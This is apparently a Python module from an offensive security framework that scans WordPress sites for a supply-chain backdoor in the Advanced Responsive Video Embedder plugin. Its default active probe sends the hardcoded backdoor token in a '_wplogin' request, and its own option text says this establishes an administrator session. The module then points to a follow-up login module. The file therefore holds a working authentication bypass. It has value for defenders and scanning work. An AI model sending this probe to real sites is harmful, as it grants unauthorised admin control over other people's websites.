#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ARVE 10.8.7/10.8.8 supply-chain backdoor (CVE-2026-18072)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "advanced-responsive-video-embedder"
_BACKDOOR_TOKEN = "35fe7057ffed92ff7bc5a0b90f302a77fb5843ad6c972294d68da0b0553b3900"
_VULN_VERSIONS = ("10.8.7", "10.8.8")


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "ARVE CVE-2026-18072 backdoor detect",
        "description": (
            "Detects CVE-2026-18072 in compromised Advanced Responsive Video Embedder "
            "10.8.7/10.8.8 via _wplogin backdoor (302 + wordpress_logged_in cookie)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-18072",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-18072",
            "https://www.wordfence.com/blog/2026/07/wordfence-prism-detected-backdoored-wordpress-plugin-within-two-hours-of-it-being-introduced/",
        ],
        "modules": ["auxiliary/admin/http/arve_cve_2026_18072_backdoor_login"],
        "tags": ["web", "scanner", "wordpress", "arve", "backdoor", "cve-2026-18072"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/arve_cve_2026_18072_backdoor_login"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    active_probe = OptBool(
        True,
        "Send _wplogin backdoor probe (establishes admin session if vulnerable)",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _backdoor_hit(self, response) -> bool:
        if not response or int(response.status_code or 0) != 302:
            return False
        headers = str(response.headers)
        if "/wp-admin/" not in headers and "wp-admin" not in (response.headers.get("Location") or ""):
            return False
        if re.search(r"(?i)wordpress_logged_in_[a-f0-9]{32}=", headers):
            return True
        for cookie in response.cookies:
            if cookie.name.startswith("wordpress_logged_in_"):
                return True
        return False

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        version_hint = version in _VULN_VERSIONS if version else None
        if version and version not in _VULN_VERSIONS and not self.active_probe:
            return False
        if not self.active_probe:
            if version_hint:
                self.set_info(
                    severity="critical",
                    reason=f"ARVE {version} matches backdoored releases",
                    cve="CVE-2026-18072",
                )
                return True
            return False
        path = self._join(f"/?_wplogin={_BACKDOOR_TOKEN}")
        response = self.http_request(method="GET", path=path, allow_redirects=False)
        if self._backdoor_hit(response):
            self.set_info(
                severity="critical",
                reason="ARVE _wplogin backdoor grants administrator session",
                path=path.split("?", 1)[0],
                cve="CVE-2026-18072",
            )
            return True
        if version_hint:
            self.set_info(
                severity="high",
                reason=f"ARVE {version} installed; backdoor probe did not confirm session",
                cve="CVE-2026-18072",
            )
            return True
        return False
